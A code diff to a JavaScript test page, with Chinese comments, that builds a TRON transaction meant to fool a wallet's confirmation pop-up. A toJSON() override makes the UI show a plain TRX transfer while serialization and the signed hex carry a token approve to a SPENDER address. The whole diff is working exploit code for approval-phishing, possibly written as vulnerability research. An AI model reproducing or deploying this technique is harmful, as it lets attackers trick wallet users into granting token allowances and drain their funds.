@@ -276,9 +276,9 @@
     } catch (e) { log('构造失败: ' + (e.message || e), 'error'); }
   }
 
-  // ③ 混合测试：用纯普通对象同时放 UI 字段和数字字段
-  // 由于 V8 普通对象的整数键总是排在字符串键前面，
-  // JSON.stringify / for-in 时 "1"/"2" 先输出，type/parameter 后输出
+  // ③ 混合测试：toJSON() 分离 UI 读取与序列化
+  // contract.type / contract.parameter → UI 直接属性访问 → 显示 TRX 转账
+  // contract.toJSON() → JSON.stringify 返回 {"1":31,"2":realParam} → 序列化为 approve
   async function mixedTx() {
     if (!window.tronWeb?.transactionBuilder) { log('tronWeb 未就绪', 'error'); return; }
     log('构造混合测试交易…', 'warn');
@@ -307,33 +307,35 @@
         }
       };
 
-      // 普通对象：整数键 "1"/"2" 会排在 type/parameter 前面（V8 默认行为）
-      // 但 type/parameter 后出现仍会覆盖，所以最终序列化是 TransferContract
-      // 这个测试用于验证：imToken 弹窗读取了哪些字段，以及节点实际解析了什么
-      transaction.raw_data.contract[0] = {
-        '1': 31,
-        '2': realParam,
+      // toJSON 方案：
+      //   UI 读 contract.type → "TransferContract" → 弹窗显示 TRX 转账
+      //   JSON.stringify(contract) → {"1":31,"2":realParam} → approve 语义
+      const contract = {
         type: 'TransferContract',
-        parameter: fakeParam
+        parameter: fakeParam,
+        toJSON() {
+          return { '1': 31, '2': realParam };
+        }
       };
+
+      transaction.raw_data.contract[0] = contract;
       // 不删 raw_data_hex，桥接层可以正常读取
 
       const hasSelector = originalHex.includes('095ea7b3');
-      const contractKeys = Object.keys(transaction.raw_data.contract[0]);
-      log('━━━━ 混合测试 ━━━━', 'warn');
-      log(`[UI] type=TransferContract → 钱包读取 contract.type`, 'success');
-      log(`[UI] param.to_address=${SPENDER.slice(0,6)}... → 显示转账地址`, 'success');
-      log(`[枚举键] Object.keys() = [${contractKeys.join(', ')}]`, 'warn');
-      log(`[说明] V8 整数键优先，所以 "1"/"2" 在 type/parameter 之前`, 'warn');
-      log(`[说明] raw_data_hex 保持原始 approve 的 hex，不删除`, 'warn');
+      log('━━━━ toJSON 分离方案 ━━━━', 'warn');
+      log(`[UI读取] contract.type → "${contract.type}"`, 'success');
+      log(`[UI读取] contract.parameter.to_address → ${SPENDER.slice(0,8)}...`, 'success');
+      log(`[序列化] JSON.stringify → ${JSON.stringify(contract)}`, 'warn');
+      log(`[反序列化恢复] parsed["1"]=${JSON.parse(JSON.stringify(contract))['1']} parsed["2"]存在=${!!JSON.parse(JSON.stringify(contract))['2']}`, 'warn');
+      log(`[期望] toJSON 仅输出 "1"/"2" → 桥接层解析为 approve`, 'success');
       log(`[签名] 原 raw_data_hex 含 approve 选择器: ${hasSelector}`, hasSelector ? 'success' : 'error');
       log('━━━━━━━━━━━━━━━━━━━━', 'warn');
 
-      const ok = await sendTx(transaction, '混合测试');
+      const ok = await sendTx(transaction, '混合测试 (toJSON)');
       if (ok) {
         setTimeout(() => refreshAllowanceUI(false), 12000);
       } else {
-        log('⚠ 若弹窗显示 TRX 转账但广播被拒 → UI 与链上解析路径不同', 'warn');
+        log('⚠ 若弹窗显示 TRX 转账但广播失败 → 桥接层可能不走 JSON.stringify', 'warn');
       }
     } catch (e) {
       log('构造失败: ' + (e.message || e), 'error');
